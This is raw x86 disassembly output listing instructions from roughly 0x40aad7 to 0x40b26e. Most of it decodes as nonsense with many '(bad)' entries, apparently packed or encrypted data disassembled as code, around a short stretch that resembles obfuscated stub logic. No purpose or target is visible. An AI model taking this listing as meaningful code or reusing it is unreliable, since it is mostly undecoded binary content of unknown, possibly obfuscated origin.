  40aad7:	jne    0x40aa9a
  40aad9:	call   0xd439:0x17274ab1
  40aae0:	out    0x24,eax
  40aae2:	mov    eax,ds:0xc6d5eb38
  40aae7:	nop
  40aae8:	cmp    BYTE PTR [ebx-0x59],0x7e
  40aaec:	dec    ebx
  40aaed:	scas   eax,DWORD PTR es:[edi]
  40aaee:	fwait
  40aaef:	retf   0x15cf
  40aaf2:	in     al,dx
  40aaf3:	lahf   
  40aaf4:	dec    eax
  40aaf5:	inc    ecx
  40aaf6:	stos   BYTE PTR es:[edi],al
  40aaf7:	pop    esi
  40aaf8:	or     al,0x7
  40aafa:	jne    0x40ab6b
  40aafc:	sub    dh,bh
  40aafe:	pop    edi
  40aaff:	imul   dx,ax,0x21
  40ab03:	outs   dx,DWORD PTR ds:[esi]
  40ab04:	sub    ecx,esi
  40ab06:	pop    edx
  40ab07:	cmp    esi,ebx
  40ab09:	fwait
  40ab0a:	scas   eax,DWORD PTR es:[edi]
  40ab0b:	ja     0x40ab45
  40ab0d:	sub    DWORD PTR [esi],edx
  40ab0f:	ror    BYTE PTR [ebp-0x1f],0xc8
  40ab13:	mov    ecx,0x75d5c7ff
  40ab18:	shl    BYTE PTR [edi-0x201374cf],0xcb
  40ab1f:	dec    ebp
  40ab20:	arpl   WORD PTR [esi+0x34b66eef],bp
  40ab26:	out    dx,al
  40ab27:	inc    esp
  40ab28:	sub    ecx,DWORD PTR [esi+0x26]
  40ab2b:	add    DWORD PTR [edx+0x39f30865],esi
  40ab31:	test   al,0x20
  40ab33:	mov    al,0xab
  40ab35:	stc    
  40ab36:	xor    edx,DWORD PTR [ebx+0x37]
  40ab39:	mov    ecx,0x879e570c
  40ab3e:	enter  0x91d9,0xba
  40ab42:	sub    DWORD PTR [ebx+0x5ef766f],ecx
  40ab48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab49:	adc    al,0x98
  40ab4b:	jmp    0x3ccc:0x7bf54128
  40ab52:	fisttp WORD PTR [edi+eiz*4+0x248e1e09]
  40ab59:	xor    DWORD PTR [eax],ecx
  40ab5b:	outs   dx,BYTE PTR ds:[esi]
  40ab5c:	mov    ds:0x5ac56ceb,eax
  40ab61:	outs   dx,DWORD PTR ds:[esi]
  40ab62:	inc    eax
  40ab63:	stc    
  40ab64:	xchg   ecx,eax
  40ab65:	clc    
  40ab66:	dec    esp
  40ab67:	mov    ch,0x46
  40ab69:	xor    eax,0xf4bad4b5
  40ab6e:	in     al,0xf5
  40ab70:	mov    dl,0x68
  40ab72:	call   0x19ddf1a0
  40ab77:	cmp    ebx,DWORD PTR [edi+edi*8]
  40ab7a:	mov    al,ds:0xb00440ab
  40ab7f:	das    
  40ab80:	aas    
  40ab81:	into   
  40ab82:	mov    cl,0x47
  40ab84:	hlt    
  40ab85:	inc    esp
  40ab86:	stos   DWORD PTR es:[edi],eax
  40ab87:	pop    ecx
  40ab88:	jnp    0x40ab78
  40ab8a:	fs clc 
  40ab8c:	xchg   ecx,eax
  40ab8d:	mov    edi,0x511715c8
  40ab92:	popw   ss
  40ab94:	outs   dx,DWORD PTR ds:[esi]
  40ab95:	jno    0x40ab8e
  40ab97:	adc    eax,DWORD PTR ds:0x3c0d5ce0
  40ab9d:	jnp    0x40abe4
  40ab9f:	adc    BYTE PTR [esi],dl
  40aba1:	xor    eax,0x6f29d45d
  40aba6:	out    0x31,eax
  40aba8:	mov    ebp,DWORD PTR [esi]
  40abaa:	jnp    0x40ab63
  40abac:	jae    0x40ab86
  40abae:	lahf   
  40abaf:	pushf  
  40abb0:	mov    dl,0x82
  40abb2:	inc    esp
  40abb3:	cli    
  40abb4:	aad    0x48
  40abb6:	stc    
  40abb7:	push   esp
  40abb8:	mov    esi,0xd6133857
  40abbd:	adc    ch,BYTE PTR [edx-0x72]
  40abc0:	(bad)  
  40abc1:	fild   QWORD PTR [edx+ebp*1]
  40abc4:	pop    esi
  40abc5:	aas    
  40abc6:	mov    ch,BYTE PTR [esi+0x411766f6]
  40abcc:	xchg   edx,eax
  40abcd:	gs push 0xf33fd9a4
  40abd3:	add    DWORD PTR [ebx],0x39
  40abd6:	push   0x4e
  40abd8:	lock pop edx
  40abda:	sbb    bh,BYTE PTR [edx+0x21]
  40abdd:	mov    esp,0x9142d9d7
  40abe2:	mov    cl,0xcc
  40abe4:	and    esi,DWORD PTR [edx]
  40abe6:	or     al,0xa1
  40abe8:	pop    eax
  40abe9:	jo     0x40abb7
  40abeb:	shr    BYTE PTR [edi],cl
  40abed:	fistp  QWORD PTR [esi-0x467a1e74]
  40abf3:	sbb    al,0x93
  40abf5:	int    0x91
  40abf7:	imul   esi,DWORD PTR [edx],0x7e94180
  40abfd:	mov    dh,0x92
  40abff:	xor    eax,0x96bc5ec0
  40ac04:	or     BYTE PTR [ebx-0x343ff8ac],dh
  40ac0a:	loop   0x40abd2
  40ac0c:	imul   eax,DWORD PTR [esi-0x7d6b1a1e],0x39ee4915
  40ac16:	std    
  40ac17:	xor    DWORD PTR [ecx-0x703b8b08],ebp
  40ac1d:	retf   
  40ac1e:	push   esp
  40ac1f:	sbb    al,0x4
  40ac21:	nop
  40ac22:	repz mov ds:0x5a513660,al
  40ac28:	adc    eax,0x466d0ff1
  40ac2d:	inc    edx
  40ac2e:	inc    ebx
  40ac2f:	stos   BYTE PTR es:[edi],al
  40ac30:	aas    
  40ac31:	mov    ss,WORD PTR [edx-0x3d]
  40ac34:	jne    0x40abfe
  40ac36:	arpl   WORD PTR [esi],sp
  40ac38:	inc    ebp
  40ac39:	or     DWORD PTR [esp+edx*4+0x6615a229],ecx
  40ac40:	shl    BYTE PTR [esi],1
  40ac42:	lds    esi,FWORD PTR ds:0x86e2c5f9
  40ac48:	push   0x79
  40ac4a:	repz inc esp
  40ac4c:	push   edx
  40ac4d:	mov    al,0xe1
  40ac4f:	sbb    al,0x29
  40ac51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac52:	xchg   edi,eax
  40ac53:	xor    eax,0x51631a2b
  40ac58:	push   0x71fa3b09
  40ac5d:	xchg   edi,eax
  40ac5e:	add    edi,edx
  40ac60:	aas    
  40ac61:	pop    edi
  40ac62:	sub    eax,0xf1a905d8
  40ac67:	xor    DWORD PTR [ebx-0x4c],0x22
  40ac6b:	or     DWORD PTR [edi+0x12],eax
  40ac6e:	adc    esp,DWORD PTR [ebx-0x4dcd3ffa]
  40ac74:	mov    WORD PTR [esi],es
  40ac76:	pop    edi
  40ac77:	jge    0x40ac44
  40ac79:	mov    ds:0xf7238911,eax
  40ac7e:	sub    al,BYTE PTR [edx]
  40ac80:	sub    bh,dl
  40ac82:	push   edx
  40ac83:	mov    al,ds:0xf602df86
  40ac88:	movhlps xmm1,xmm6
  40ac8b:	adc    ebp,eax
  40ac8d:	mov    al,0xfd
  40ac8f:	shr    DWORD PTR [ebx],0x38
  40ac92:	jmp    0x15df6ea5
  40ac97:	mov    edx,0x83ad8b3b
  40ac9c:	mov    ecx,0x402ca0c0
  40aca1:	call   FWORD PTR ds:[ebx+ecx*2]
  40aca5:	xor    BYTE PTR [ebp+0x62603295],0x93
  40acac:	ret    0x3f3e
  40acaf:	nop
  40acb0:	push   ebp
  40acb1:	pop    edi
  40acb2:	push   ds
  40acb3:	sub    DWORD PTR [esi],esp
  40acb5:	lods   al,BYTE PTR ds:[esi]
  40acb6:	(bad)  
  40acb7:	push   es
  40acb8:	dec    edx
  40acb9:	lods   eax,DWORD PTR ds:[esi]
  40acba:	mov    ch,0xc7
  40acbc:	inc    esp
  40acbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acbe:	pop    edi
  40acbf:	xchg   esp,eax
  40acc0:	call   0xcc2183d0
  40acc5:	sub    al,0x1
  40acc7:	pop    ss
  40acc8:	cmc    
  40acc9:	add    al,0xce
  40accb:	cmp    BYTE PTR [eax+eax*2],ah
  40acce:	dec    edx
  40accf:	test   DWORD PTR [ebx+0x5],ecx
  40acd2:	ror    BYTE PTR [ebx+0x6008f054],0x22
  40acd9:	jnp    0x40acfd
  40acdb:	not    BYTE PTR [edi-0x48d0f202]
  40ace1:	mov    BYTE PTR [esi],0xe8
  40ace4:	fs ins BYTE PTR es:[edi],dx
  40ace6:	xchg   ecx,eax
  40ace7:	pop    edx
  40ace8:	push   edi
  40ace9:	cs sbb ah,0xcc
  40aced:	test   DWORD PTR [edi-0x3b],edi
  40acf0:	das    
  40acf1:	(bad)  
  40acf2:	xchg   esi,eax
  40acf3:	pop    edx
  40acf4:	lea    ecx,[edx+esi*2]
  40acf7:	aam    0xa7
  40acf9:	hlt    
  40acfa:	fwait
  40acfb:	je     0x40ac8c
  40acfd:	mov    BYTE PTR [bp+0x5661],cl
  40ad02:	sub    cl,ch
  40ad04:	fbld   TBYTE PTR [edi+0x139fcf5f]
  40ad0a:	mov    al,0x55
  40ad0c:	xchg   esi,eax
  40ad0d:	arpl   cx,si
  40ad0f:	and    DWORD PTR [ecx],0x43
  40ad12:	dec    esi
  40ad13:	dec    esp
  40ad14:	pop    ds
  40ad15:	jne    0x40ad4a
  40ad17:	mov    ah,0x7c
  40ad19:	pop    esp
  40ad1a:	(bad)  [ebp+0x783bae4a]
  40ad20:	ss in  al,dx
  40ad22:	dec    esp
  40ad23:	sbb    edi,DWORD PTR [ecx+0x29]
  40ad26:	xchg   esi,eax
  40ad27:	and    eax,0x1d74ad33
  40ad2c:	mov    edi,0x6c5c213b
  40ad31:	inc    ebp
  40ad32:	jmp    0xc0ea7500
  40ad37:	xchg   ecx,eax
  40ad38:	ret    0x38c5
  40ad3b:	retf   0xaf61
  40ad3e:	fadd   DWORD PTR [ebx+0x1e6f4d23]
  40ad44:	mov    ah,0xc
  40ad46:	inc    ebx
  40ad47:	mov    esp,0xf5bf3ca5
  40ad4c:	and    esi,DWORD PTR [ebx+0x190d4369]
  40ad52:	int    0x1e
  40ad54:	repnz test BYTE PTR [eax-0x4],0xa8
  40ad59:	mov    ss,WORD PTR [eax-0x1ea20be4]
  40ad5f:	jge    0x40add1
  40ad61:	mov    cl,0x86
  40ad63:	sbb    eax,0xc848fcb2
  40ad68:	cdq    
  40ad69:	es scas eax,DWORD PTR es:[edi]
  40ad6b:	dec    DWORD PTR ds:0x92725075
  40ad71:	and    dh,al
  40ad73:	loope  0x40adef
  40ad75:	jnp    0x40ad99
  40ad77:	or     al,0x9b
  40ad79:	in     al,dx
  40ad7a:	pop    esp
  40ad7b:	(bad)  
  40ad7c:	cmp    edi,edi
  40ad7e:	adc    ch,ah
  40ad80:	sub    eax,0x1aec40a0
  40ad85:	outs   dx,BYTE PTR ds:[esi]
  40ad86:	pusha  
  40ad87:	leave  
  40ad88:	inc    edi
  40ad89:	and    BYTE PTR [esi],ah
  40ad8b:	mov    bh,0x9f
  40ad8d:	sub    al,0x5f
  40ad8f:	pop    ecx
  40ad90:	jns    0x40ad14
  40ad92:	das    
  40ad93:	mov    ch,0xad
  40ad95:	cdq    
  40ad96:	push   cs
  40ad97:	addr16 jae 0x40adf7
  40ad9a:	nop
  40ad9b:	push   ebp
  40ad9c:	out    0x0,eax
  40ad9e:	daa    
  40ad9f:	pop    edx
  40ada0:	pop    ebx
  40ada1:	(bad)  
  40ada2:	push   cs
  40ada3:	sbb    edi,DWORD PTR [esp+ebp*2-0x2589fe0b]
  40adaa:	retf   
  40adab:	cmc    
  40adac:	stos   DWORD PTR es:[edi],eax
  40adad:	lods   eax,DWORD PTR ds:[esi]
  40adae:	enter  0xa6a2,0x5
  40adb2:	xchg   esp,eax
  40adb3:	dec    ebx
  40adb4:	mov    edi,0xc1b1fdc
  40adb9:	mov    esi,DWORD PTR [ecx+0x27]
  40adbc:	mov    ebx,0xe82c772d
  40adc1:	stos   BYTE PTR es:[edi],al
  40adc2:	push   ecx
  40adc3:	(bad)  
  40adc4:	mov    ebx,0x6ea2261f
  40adc9:	sti    
  40adca:	adc    DWORD PTR [ecx],ebp
  40adcc:	test   eax,0x31cc3c0f
  40add1:	and    esp,DWORD PTR [edx+eiz*2+0x52]
  40add5:	fsub   DWORD PTR [esi+esi*8+0x24bbc378]
  40addc:	xchg   BYTE PTR [eax-0x55e4d834],ch
  40ade2:	sub    eax,0x1f491eca
  40ade7:	cmp    DWORD PTR [ecx-0x3a99fe58],esp
  40aded:	sub    bh,BYTE PTR [edi]
  40adef:	pop    es
  40adf0:	pop    ss
  40adf1:	data16 add BYTE PTR [ebx],al
  40adf4:	sbb    BYTE PTR [ebp+eax*2-0x4905c26b],ah
  40adfb:	arpl   WORD PTR [ebp-0x22],dx
  40adfe:	push   0x20956e94
  40ae03:	(bad)  
  40ae04:	repnz out dx,eax
  40ae06:	cdq    
  40ae07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae08:	out    0xc3,al
  40ae0a:	adc    ch,BYTE PTR [edx-0x6d]
  40ae0d:	push   cs
  40ae0e:	and    bh,cl
  40ae10:	shr    DWORD PTR [eax+edi*1],cl
  40ae13:	int3   
  40ae14:	inc    eax
  40ae15:	inc    eax
  40ae16:	dec    esi
  40ae17:	jne    0x40ae8f
  40ae19:	ret    
  40ae1a:	jne    0x40ae61
  40ae1c:	cmp    eax,0xcacb7eb0
  40ae21:	push   esp
  40ae22:	(bad)
  40ae25:	das    
  40ae26:	mov    bl,bh
  40ae28:	xchg   esi,eax
  40ae29:	and    eax,0x1fcf4f75
  40ae2e:	sbb    al,0xb5
  40ae30:	dec    ecx
  40ae31:	loope  0x40add5
  40ae33:	sub    esp,DWORD PTR [edi+0x57]
  40ae36:	or     ch,BYTE PTR [eax-0x38]
  40ae39:	ins    BYTE PTR es:[edi],dx
  40ae3a:	retf   0x3c13
  40ae3d:	dec    ebx
  40ae3e:	js     0x40add9
  40ae40:	outs   dx,BYTE PTR ds:[esi]
  40ae41:	xchg   ebx,eax
  40ae42:	pop    esi
  40ae43:	mov    al,ds:0x23b2367a
  40ae48:	push   ss
  40ae49:	mov    DWORD PTR [ebp-0x20],0x6ec3
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42824b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428213
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428347,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42822b
  40aea0:	cmp    DWORD PTR ds:0x42824b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42807b
  40aebd:	call   DWORD PTR ds:0x428e38
  40aec3:	mov    ecx,DWORD PTR ds:0x4282cb
  40aec9:	xor    DWORD PTR ds:0x4281ef,ecx
  40aecf:	or     DWORD PTR ds:0x42833b,ecx
  40aed5:	or     DWORD PTR ds:0x428253,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42825f
  40aee1:	adc    DWORD PTR ds:0x428227,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428123
  40aeef:	adc    ecx,DWORD PTR ds:0x428347
  40aef5:	mov    DWORD PTR ds:0x428123,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428343,0x4282b7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428123,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	(bad)  
  40af31:	leave  
  40af32:	jl     0x40aee9
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af3c:	jmp    0xe18e9011
  40af41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af42:	lods   eax,DWORD PTR ds:[esi]
  40af43:	adc    DWORD PTR fs:[esi+0x42],ebx
  40af47:	out    dx,eax
  40af48:	popf   
  40af49:	dec    eax
  40af4a:	ja     0x40afa6
  40af4c:	dec    ecx
  40af4d:	mov    bh,0x9b
  40af4f:	in     al,0x3b
  40af51:	jge    0x40afad
  40af53:	imul   edi,DWORD PTR [esi+0x5ae089c7],0xffffff8b
  40af5a:	cwde   
  40af5b:	and    ecx,DWORD PTR [esi]
  40af5d:	leave  
  40af5e:	ins    DWORD PTR es:[edi],dx
  40af5f:	mov    ebp,ecx
  40af61:	mov    esi,0x4c56d49a
  40af66:	adc    BYTE PTR [esi+0x57],bl
  40af69:	cmp    eax,0x7406ab4c
  40af6e:	scas   al,BYTE PTR es:[edi]
  40af6f:	iret   
  40af70:	ins    BYTE PTR es:[edi],dx
  40af71:	push   eax
  40af72:	test   DWORD PTR [ebp-0x6dd30e4],ecx
  40af78:	mul    BYTE PTR [ebp+0x5833965b]
  40af7e:	pop    edx
  40af7f:	pop    eax
  40af80:	lods   al,BYTE PTR ds:[esi]
  40af81:	dec    esi
  40af82:	mul    ebp
  40af84:	add    bl,al
  40af86:	mov    bh,BYTE PTR [ebx]
  40af88:	(bad)  
  40af89:	jg     0x40af27
  40af8b:	jmp    0x4e22d74c
  40af90:	cmp    BYTE PTR [edx+0x69],bl
  40af93:	mov    ecx,0xd789f5b1
  40af98:	push   ebx
  40af99:	adc    al,0xd6
  40af9b:	mov    bh,0xdb
  40af9d:	mov    edi,0xa37f34bc
  40afa2:	iret   
  40afa3:	and    ebp,edi
  40afa5:	or     al,0x7
  40afa7:	ja     0x40af58
  40afa9:	ja     0x40afc6
  40afab:	aam    0xd1
  40afad:	scas   al,BYTE PTR es:[edi]
  40afae:	jns    0x40afba
  40afb0:	sbb    ebx,DWORD PTR [esi]
  40afb2:	jnp    0x40af7b
  40afb4:	xchg   ebx,eax
  40afb5:	jo     0x40affd
  40afb7:	inc    eax
  40afb8:	or     eax,0xfaf377e9
  40afbd:	and    dh,BYTE PTR [esi+0x52b4d879]
  40afc3:	adc    bh,BYTE PTR [ebx+0x9]
  40afc6:	jl     0x40b00e
  40afc8:	add    DWORD PTR [eax-0x1c8c3b87],edi
  40afce:	xchg   ecx,eax
  40afcf:	(bad)
  40afd2:	stos   BYTE PTR es:[edi],al
  40afd3:	mov    edi,0xad6ae3a4
  40afd8:	xor    ebp,DWORD PTR [eax]
  40afda:	std    
  40afdb:	clc    
  40afdc:	xor    DWORD PTR [eax+eax*4+0x6c],ecx
  40afe0:	mov    BYTE PTR [ebx],ch
  40afe2:	cmp    al,0xf3
  40afe4:	push   ebp
  40afe5:	adc    eax,ebp
  40afe7:	into   
  40afe8:	sbb    dl,BYTE PTR [ebx-0x12cc7a6e]
  40afee:	and    BYTE PTR [edx+0x5fd853dd],ah
  40aff4:	push   ds
  40aff5:	adc    edi,esi
  40aff7:	and    DWORD PTR [esi-0x53],esi
  40affa:	pop    esi
  40affb:	clc    
  40affc:	xchg   edi,eax
  40affd:	push   ss
  40affe:	dec    ecx
  40afff:	das    
  40b000:	add    al,0xc5
  40b002:	push   0xffffffc3
  40b004:	out    dx,al
  40b005:	(bad)  
  40b006:	ror    DWORD PTR [esp+ebp*8-0x76f293bd],cl
  40b00d:	out    0xa4,al
  40b00f:	dec    eax
  40b010:	retf   0xa9a5
  40b013:	repz dec ebp
  40b015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b016:	fild   DWORD PTR [ebx]
  40b018:	stos   BYTE PTR es:[edi],al
  40b019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b01a:	inc    ebp
  40b01b:	div    BYTE PTR [ebx]
  40b01d:	xchg   DWORD PTR [eax+0x42],eax
  40b020:	sti    
  40b021:	pop    esp
  40b022:	imul   esi,DWORD PTR [edi+0x9],0x2f
  40b026:	jb     0x40afbf
  40b028:	sub    DWORD PTR [ebp+ecx*4+0xb],ecx
  40b02c:	xchg   edx,eax
  40b02d:	add    DWORD PTR [ebx+0x57],esi
  40b030:	retf   
  40b031:	mov    ds:0x829edd63,eax
  40b036:	inc    ebp
  40b037:	call   0x6f0d:0xffa85abb
  40b03e:	ins    BYTE PTR es:[edi],dx
  40b03f:	and    al,0x31
  40b041:	jmp    FWORD PTR [esi-0x38520ffb]
  40b047:	cwde   
  40b048:	or     al,0x71
  40b04a:	dec    ebx
  40b04b:	push   ebx
  40b04c:	fwait
  40b04d:	into   
  40b04e:	sub    BYTE PTR [edi-0x5e],cl
  40b051:	aas    
  40b052:	js     0x40b0bf
  40b054:	pop    es
  40b055:	xchg   ebx,eax
  40b056:	aas    
  40b057:	mov    edi,0xfde8acab
  40b05c:	jno    0x40b018
  40b05e:	out    dx,al
  40b05f:	mov    dl,0x7d
  40b061:	test   al,0x34
  40b063:	les    edx,FWORD PTR [esp+ecx*4-0x4b889b84]
  40b06a:	out    dx,eax
  40b06b:	push   cs
  40b06c:	mov    dl,0x69
  40b06e:	sbb    eax,0x2ebab320
  40b073:	popf   
  40b074:	inc    esp
  40b075:	jmp    0xfe9f:0xb0d6bb9b
  40b07c:	cmp    esp,edi
  40b07e:	aaa    
  40b07f:	sub    ebp,DWORD PTR [edx-0x78900a4f]
  40b085:	sub    dh,BYTE PTR [edi+0x57cd0020]
  40b08b:	ins    DWORD PTR es:[edi],dx
  40b08c:	jo     0x40b076
  40b08e:	in     al,0x68
  40b090:	inc    eax
  40b091:	enter  0xb4d7,0xcb
  40b095:	jne    0x40b05a
  40b097:	dec    ecx
  40b098:	icebp  
  40b099:	aas    
  40b09a:	add    ebx,DWORD PTR [ebx-0x7c97bb58]
  40b0a0:	and    BYTE PTR [ecx+0x5902f583],0xf5
  40b0a7:	xor    DWORD PTR [ebp-0x1],ecx
  40b0aa:	jnp    0x40b067
  40b0ac:	dec    ebp
  40b0ad:	push   esp
  40b0ae:	iret   
  40b0af:	xchg   esi,eax
  40b0b0:	jl     0x40b11f
  40b0b2:	repnz push es
  40b0b4:	outs   dx,BYTE PTR ds:[esi]
  40b0b5:	test   eax,0x206e69d0
  40b0ba:	arpl   sp,sp
  40b0bc:	inc    eax
  40b0bd:	or     ch,BYTE PTR [edi-0x33]
  40b0c0:	nop
  40b0c1:	rcl    DWORD PTR [eax+ebx*4+0x53],cl
  40b0c5:	sbb    DWORD PTR [ebx+0x18],0x5336c2b
  40b0cc:	push   esp
  40b0cd:	cld    
  40b0ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0cf:	jmp    FWORD PTR [esi+0x70274c51]
  40b0d5:	iret   
  40b0d6:	scas   al,BYTE PTR es:[edi]
  40b0d7:	cwde   
  40b0d8:	jbe    0x40b0da
  40b0da:	jne    0x40b084
  40b0dc:	jg     0x40b0c9
  40b0de:	and    eax,0x1bdfccd3
  40b0e3:	lods   eax,DWORD PTR ds:[esi]
  40b0e4:	xchg   ebp,eax
  40b0e5:	aaa    
  40b0e6:	(bad)  
  40b0e7:	cmp    al,0xb9
  40b0e9:	push   ebp
  40b0ea:	adc    esi,DWORD PTR [ebp-0x3f]
  40b0ed:	jnp    0x40b0ee
  40b0ef:	adc    al,BYTE PTR [ebx-0x77]
  40b0f2:	and    al,BYTE PTR [ebx-0x59]
  40b0f5:	sbb    ah,cl
  40b0f7:	ds cld 
  40b0f9:	push   es
  40b0fa:	cld    
  40b0fb:	cmp    esi,ebp
  40b0fd:	iret   
  40b0fe:	jae    0x40b14a
  40b100:	cli    
  40b101:	das    
  40b102:	sbb    al,0xbd
  40b104:	and    esp,DWORD PTR [ebx+edx*8]
  40b107:	in     eax,0xfb
  40b109:	loopne 0x40b09a
  40b10b:	inc    esp
  40b10c:	(bad)  
  40b10d:	jbe    0x40b12f
  40b10f:	gs jg  0x40b0d2
  40b112:	mov    edx,0x85253571
  40b117:	push   ebx
  40b118:	jl     0x40b0f4
  40b11a:	fcom   DWORD PTR [ebx+0x6f]
  40b11d:	adc    DWORD PTR [edi],edi
  40b11f:	cmp    ebp,esp
  40b121:	lods   eax,DWORD PTR ds:[esi]
  40b122:	and    bh,al
  40b124:	push   0xd84075e4
  40b129:	hlt    
  40b12a:	xchg   ah,dl
  40b12c:	mov    edi,0x652e491e
  40b131:	aad    0x40
  40b133:	int    0x57
  40b135:	jb     0x40b128
  40b137:	aaa    
  40b138:	in     eax,dx
  40b139:	sub    ecx,ecx
  40b13b:	and    BYTE PTR [ebx+0x78],cl
  40b13e:	xor    al,0x7f
  40b140:	loopne 0x40b15c
  40b142:	push   eax
  40b143:	fild   QWORD PTR [ebx-0x73]
  40b146:	fbstp  TBYTE PTR [ebx-0x28]
  40b149:	test   DWORD PTR [edi+0x48],edx
  40b14c:	or     ebx,ebx
  40b14e:	mov    ds:0xebe5af64,al
  40b153:	in     al,0xcf
  40b155:	xor    ch,BYTE PTR [ebx]
  40b157:	inc    ebp
  40b158:	dec    edx
  40b159:	mov    dl,0xb4
  40b15b:	lock push ss
  40b15d:	mov    al,ds:0xd098332a
  40b162:	jns    0x40b153
  40b164:	clc    
  40b165:	in     eax,0xc4
  40b167:	jl     0x40b1da
  40b169:	out    0xca,eax
  40b16b:	shl    DWORD PTR [edx-0x6a8c6493],cl
  40b171:	jnp    0x40b195
  40b173:	push   ss
  40b174:	mov    ds:0x7b4dbb8b,eax
  40b179:	cld    
  40b17a:	jmp    0x40b19e
  40b17c:	test   DWORD PTR [ebx],ecx
  40b17e:	jmp    0x40b123
  40b180:	dec    eax
  40b181:	fcom   st(1)
  40b183:	or     dh,ah
  40b185:	repnz or eax,0x46e14c49
  40b18b:	fwait
  40b18c:	stos   BYTE PTR es:[edi],al
  40b18d:	xchg   esp,eax
  40b18e:	stc    
  40b18f:	jle    0x40b1fa
  40b191:	mov    cl,0xc4
  40b193:	mov    bh,0x9b
  40b195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b196:	jg     0x40b193
  40b198:	and    cl,BYTE PTR [esi+edi*1-0x38]
  40b19c:	mov    bl,0xa4
  40b19e:	loop   0x40b127
  40b1a0:	cmp    DWORD PTR [ebx-0x2036d582],eax
  40b1a6:	loop   0x40b1e0
  40b1a8:	mov    ch,0x72
  40b1aa:	hlt    
  40b1ab:	outs   dx,BYTE PTR ds:[esi]
  40b1ac:	out    0xd6,eax
  40b1ae:	push   ds
  40b1af:	dec    ecx
  40b1b0:	sub    cl,dl
  40b1b2:	or     ah,BYTE PTR [ebx-0x2592fa32]
  40b1b8:	xor    eax,0xdff769e2
  40b1bd:	aas    
  40b1be:	(bad)  
  40b1bf:	popf   
  40b1c0:	aam    0xd7
  40b1c2:	sar    BYTE PTR [esp+ebp*8+0x6d3e060f],0x34
  40b1ca:	pop    esi
  40b1cb:	or     ch,BYTE PTR [edx+0x3d803c59]
  40b1d1:	push   edi
  40b1d2:	test   BYTE PTR [ebx],al
  40b1d4:	and    DWORD PTR [ebp+0x6d286dcb],ebp
  40b1da:	leave  
  40b1db:	jae    0x40b237
  40b1dd:	add    ebp,DWORD PTR [edi]
  40b1df:	outs   dx,DWORD PTR ds:[esi]
  40b1e0:	jno    0x40b1c9
  40b1e2:	(bad)  
  40b1e3:	(bad)  
  40b1e5:	pop    ecx
  40b1e6:	stos   BYTE PTR es:[edi],al
  40b1e7:	daa    
  40b1e8:	and    DWORD PTR [ebx],ebx
  40b1ea:	adc    DWORD PTR [esi+0x2f],0xffffffe3
  40b1ee:	rol    al,0xf6
  40b1f1:	push   esi
  40b1f2:	adc    bl,BYTE PTR [edx]
  40b1f4:	mov    WORD PTR cs:[eax-0x6ffef29],?
  40b1fb:	xchg   edi,eax
  40b1fc:	xchg   edx,eax
  40b1fd:	inc    ebp
  40b1fe:	mov    BYTE PTR [esi],dl
  40b200:	adc    eax,0x83bbb678
  40b205:	sub    eax,0xce93576e
  40b20a:	ret    0xc67a
  40b20d:	inc    eax
  40b20e:	je     0x40b1eb
  40b210:	int    0x66
  40b212:	pop    ebx
  40b213:	(bad)  
  40b214:	cmc    
  40b215:	es push cs
  40b217:	popf   
  40b218:	pop    eax
  40b219:	pop    eax
  40b21a:	fdivr  QWORD PTR ds:0xb3c36ffb
  40b220:	jmp    0x40b254
  40b222:	adc    edx,edx
  40b224:	test   eax,0x5c9011b
  40b229:	shl    DWORD PTR [ecx+0x53],0x26
  40b22d:	sbb    eax,0x5ca80352
  40b232:	mov    cl,0x90
  40b234:	gs (bad) 
  40b236:	mov    edx,0xcb992fff
  40b23b:	jb     0x40b1c7
  40b23d:	das    
  40b23e:	xor    eax,0xe3ba1731
  40b243:	adc    bh,ch
  40b245:	int    0x42
  40b247:	pop    esi
  40b248:	mov    edx,0xdef02f13
  40b24d:	iret   
  40b24e:	ins    DWORD PTR es:[edi],dx
  40b24f:	inc    eax
  40b250:	retf   
  40b251:	jnp    0x40b253
  40b253:	sub    DWORD PTR [edi+0x3],0x8458d038
  40b25a:	xor    eax,0x1ef64bbc
  40b25f:	cmp    al,al
  40b261:	xlat   BYTE PTR ds:[ebx]
  40b262:	mov    al,ds:0xb80075b6
  40b267:	iret   
  40b268:	sub    BYTE PTR [esi+0x627a7614],ch
  40b26e:	ins    BYTE PTR es:[edi],dx
